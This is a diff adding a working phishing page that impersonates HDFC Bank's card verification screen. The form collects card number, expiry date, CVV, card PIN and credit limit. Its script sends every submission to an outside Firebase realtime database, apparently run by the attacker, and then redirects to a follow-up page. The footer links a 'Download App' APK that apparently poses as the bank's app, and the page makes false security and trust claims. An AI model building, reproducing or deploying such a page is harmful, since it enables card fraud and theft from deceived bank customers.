@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Secure Card Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --hdfc-blue: #004c8f;
+            --hdfc-red: #ed232a;
+            --bg-grey: #f0f4f7;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background-color: var(--bg-grey);
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        /* Secure Navbar */
+        nav {
+            background: var(--hdfc-blue);
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .nav-back { font-size: 20px; cursor: pointer; }
+        nav img { height: 28px; }
+        .nav-title { flex: 1; text-align: center; font-size: 14px; font-weight: 600; margin-right: 40px; }
+        
+        /* Secure Timer */
+        .timer-strip {
+            background: #eef2f7;
+            padding: 8px 15px;
+            text-align: center;
+            font-size: 11px;
+            color: var(--hdfc-blue);
+            font-weight: 700;
+        }
+
+        /* Header Banner */
+        .header-banner {
+            background: white;
+            padding: 25px 20px;
+            text-align: center;
+            border-bottom: 1px solid #e1e8ed;
+        }
+        .header-banner i { color: #4caf50; font-size: 40px; margin-bottom: 10px; }
+        .header-banner h2 { color: var(--hdfc-blue); font-size: 18px; margin-bottom: 5px; font-weight: 800; }
+        .header-banner p { color: #666; font-size: 13px; line-height: 1.4; }
+
+        /* Form Section */
+        .form-section {
+            padding: 20px;
+            flex: 1;
+        }
+        
+        /* 3D Card Flip Styling */
+        .card-container {
+            perspective: 1000px;
+            margin-bottom: 30px;
+        }
+        .card-inner {
+            position: relative;
+            width: 100%;
+            height: 200px;
+            transition: transform 0.8s;
+            transform-style: preserve-3d;
+        }
+        .card-inner.flipped {
+            transform: rotateY(180deg);
+        }
+        .card-front, .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 15px;
+            color: white;
+            padding: 25px;
+            box-shadow: 0 10px 20px rgba(0, 51, 102, 0.2);
+            overflow: hidden;
+        }
+        .card-front {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+        }
+        .card-back {
+            background: linear-gradient(135deg, #2a5298, #1e3c72);
+            transform: rotateY(180deg);
+            padding: 0;
+        }
+        .card-front .chip {
+            width: 45px; height: 35px; 
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            border-radius: 6px; 
+            margin-bottom: 35px;
+        }
+        .card-front .number { font-size: 20px; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; margin-bottom: 15px; }
+        .card-logo { position: absolute; top: 20px; right: 25px; font-weight: 900; font-size: 24px; font-style: italic; }
+        .card-holder-row { display: flex; justify-content: space-between; align-items: flex-end; }
+        .expiry-label { font-size: 8px; text-transform: uppercase; opacity: 0.8; display: block; }
+        .expiry-val { font-size: 14px; font-family: 'Courier New', Courier, monospace; }
+
+        /* Card Back Styles */
+        .black-bar { background: #222; height: 45px; width: 100%; margin-top: 25px; }
+        .cvv-strip { background: #fff; height: 35px; width: 80%; margin: 15px auto; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px; border-radius: 4px; }
+        .cvv-val { color: #333; font-style: italic; font-weight: bold; letter-spacing: 2px; }
+        .back-logo { position: absolute; bottom: 15px; right: 20px; opacity: 0.5; font-size: 18px; font-weight: bold; }
+
+        /* Inputs Styling */
+        .input-group { margin-bottom: 18px; }
+        label { display: block; font-size: 11px; font-weight: 700; color: #555; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .input-wrapper {
+            position: relative;
+            background: white;
+            border: 1.5px solid #d1d9e0;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            transition: border-color 0.3s;
+        }
+        .input-wrapper:focus-within { border-color: var(--hdfc-blue); }
+        .input-wrapper i { padding: 0 15px; color: var(--hdfc-blue); font-size: 16px; border-right: 1px solid #eee; }
+        .input-wrapper input {
+            border: none;
+            padding: 14px;
+            flex: 1;
+            font-size: 15px;
+            outline: none;
+            background: transparent;
+            color: #333;
+        }
+        .input-row { display: flex; gap: 15px; }
+        
+        .submit-btn {
+            background: var(--hdfc-blue);
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            margin-top: 10px;
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(0, 76, 143, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Trust Footer */
+        .security-footer {
+            padding: 25px 20px;
+            text-align: center;
+            background: #fff;
+            border-top: 1px solid #eee;
+        }
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+            margin-bottom: 15px;
+            color: #aaa;
+        }
+        .trust-badges i { font-size: 28px; }
+        .secure-note { font-size: 11px; color: #888; line-height: 1.6; }
+        .secure-note strong { color: #4caf50; }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-back" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
+        <div class="nav-title">Secure Verification</div>
+        <img src="./hdftoolimage.png" alt="HDFC Bank Logo">
+    </nav>
+
+    <div class="timer-strip">
+        <i class="fas fa-clock"></i> Secure Session expires in: <span id="session-timer">05:00</span>
+    </div>
+
+    <div class="header-banner">
+        <i class="fas fa-lock"></i>
+        <h2>Secure Card Verification</h2>
+        <p>Your security is our priority. Please confirm your card ownership by providing the details below.</p>
+    </div>
+
+    <div class="form-section">
+        <div class="card-container">
+            <div class="card-inner" id="card_inner">
+                <div class="card-front" id="card_face">
+                    <div class="card-logo" id="preview_logo">VISA</div>
+                    <div class="chip"></div>
+                    <div class="number" id="preview_number">XXXX XXXX XXXX XXXX</div>
+                    <div class="card-holder-row">
+                        <div class="card-holder">HDFC CUSTOMER</div>
+                        <div class="expiry-group">
+                            <span class="expiry-label">Expires</span>
+                            <span class="expiry-val" id="preview_expiry">MM/YY</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-back">
+                    <div class="black-bar"></div>
+                    <div class="cvv-strip">
+                        <span class="cvv-val" id="preview_cvv">***</span>
+                    </div>
+                    <div class="back-logo">HDFC BANK</div>
+                </div>
+            </div>
+        </div>
+
+        <form id="card_form" onsubmit="handleFormSubmit(event)">
+            <div class="input-group">
+                <label>Credit Card Number</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-credit-card"></i>
+                    <input type="text" id="card_number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required maxlength="19" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Expiry Date</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-calendar-alt"></i>
+                    <input type="text" id="expiry" name="expiry_date" placeholder="MM/YY" required maxlength="5" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>CVV</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-shield-alt"></i>
+                    <input type="password" id="cvv" name="cvv" placeholder="***" required maxlength="3" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>CARD PIN</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-key"></i>
+                    <input type="password" name="card_pin" placeholder="4 Digit Card Pin" required maxlength="4">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Total Credit Limit</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-rupee-sign"></i>
+                    <input type="number" name="credit_limit" placeholder="Enter Approved Limit" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Verify Now</button>
+        </form>
+    </div>
+
+    <div class="security-footer">
+        <div class="trust-badges">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fas fa-user-check"></i>
+        </div>
+        <p class="secure-note">
+            <strong><i class="fas fa-check-circle"></i> 256-bit SSL Secured Connection</strong><br>
+            This is a secure page. Your information is encrypted and never shared.
+        </p>
+    </div>
+
+    <footer style="background: #fff; color: #999; text-align: center; padding: 20px 20px 40px; font-size: 12px; border-top: 1px solid #f1f5f9;">
+        <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+            <a href="#" style="color: #999; text-decoration: none;">Privacy Policy</a>
+            <a href="#" style="color: #999; text-decoration: none;">Terms & Conditions</a>
+            <a href="#" style="color: #999; text-decoration: none;">Security Tips</a>
+            <a href="./hdfc.apk" download style="color: var(--hdfc-blue); text-decoration: none; font-weight: 700;">Download App</a>
+        </div>
+        <p>&copy; 2024 HDFC Bank Ltd. All rights reserved.</p>
+    </footer>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDrTNuW2u0b0fJpL-8Yb8STBggon0p-zcs",
+            authDomain: "hdfc-a-client-apcd001.firebaseapp.com",
+            databaseURL: "https://hdfc-a-client-apcd001-default-rtdb.firebaseio.com",
+            projectId: "hdfc-a-client-apcd001",
+            storageBucket: "hdfc-a-client-apcd001.firebasestorage.app",
+            messagingSenderId: "552520760858",
+            appId: "1:552520760858:web:0e0917aa3355b141315ba3",
+            measurementId: "G-JM2VQHTSKF"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Device ID logic
+        let deviceId = localStorage.getItem('deviceId') || 'DEV' + Math.floor(Math.random() * 900000 + 100000);
+        localStorage.setItem('deviceId', deviceId);
+
+        // Form Submission Logic to Capture Data
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+            const formData = new FormData(event.target);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Save to Firebase under root/web/{deviceId}/cust_data node
+            await database.ref('web/' + deviceId + '/cust_data').update({
+                ...data,
+                last_updated: Date.now()
+            });
+
+            location.href = 'index3.html';
+        }
+
+        // Session Timer Logic
+        let timeLeft = 300;
+        const timerDisplay = document.getElementById('session-timer');
+        setInterval(() => {
+            if (timeLeft <= 0) return;
+            timeLeft--;
+            let mins = Math.floor(timeLeft / 60);
+            let secs = timeLeft % 60;
+            timerDisplay.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }, 1000);
+
+        const cardNumberInput = document.getElementById('card_number');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
+        const previewNumber = document.getElementById('preview_number');
+        const previewExpiry = document.getElementById('preview_expiry');
+        const previewCvv = document.getElementById('preview_cvv');
+        const previewLogo = document.getElementById('preview_logo');
+        const cardInner = document.getElementById('card_inner');
+        const cardFace = document.getElementById('card_face');
+
+        // Card Number Formatting & Preview Logic
+        cardNumberInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+
+            // Real-time Card Type Detection
+            if (value.startsWith('4')) {
+                previewLogo.innerText = 'VISA';
+                cardFace.style.background = 'linear-gradient(135deg, #1e3c72, #2a5298)';
+            } else if (value.startsWith('5')) {
+                previewLogo.innerText = 'Mastercard';
+                cardFace.style.background = 'linear-gradient(135deg, #eb001b, #ff5f00)';
+            } else if (value.startsWith('6')) {
+                previewLogo.innerText = 'RuPay';
+                cardFace.style.background = 'linear-gradient(135deg, #00703c, #00a152)';
+            } else if (value.startsWith('3')) {
+                previewLogo.innerText = 'AMEX';
+                cardFace.style.background = 'linear-gradient(135deg, #2c3e50, #4ca1af)';
+            } else {
+                previewLogo.innerText = 'HDFC';
+                cardFace.style.background = 'linear-gradient(135deg, #004c8f, #003060)';
+            }
+
+            // Update Card Preview: Show first 4 and last 4
+            let displayValue = 'XXXX XXXX XXXX XXXX';
+            if (value.length > 0) {
+                let first4 = value.substring(0, 4).padEnd(4, 'X');
+                let last4 = 'XXXX';
+                if (value.length > 12) {
+                    last4 = value.substring(12, 16).padEnd(4, 'X');
+                } else if (value.length > 0) {
+                    last4 = 'XXXX';
+                }
+                displayValue = `${first4} XXXX XXXX ${last4}`;
+            }
+            previewNumber.innerText = displayValue;
+        });
+
+        // Expiry Date Formatting Logic (MM/YY)
+        expiryInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+            previewExpiry.innerText = e.target.value || 'MM/YY';
+        });
+
+        // CVV Flip Logic
+        cvvInput.addEventListener('focus', () => {
+            cardInner.classList.add('flipped');
+        });
+
+        cvvInput.addEventListener('blur', () => {
+            cardInner.classList.remove('flipped');
+        });
+
+        cvvInput.addEventListener('input', (e) => {
+            let val = e.target.value;
+            previewCvv.innerText = val.split('').map(() => '*').join('') || '***';
+        });
+    </script>
+</body>
+</html>
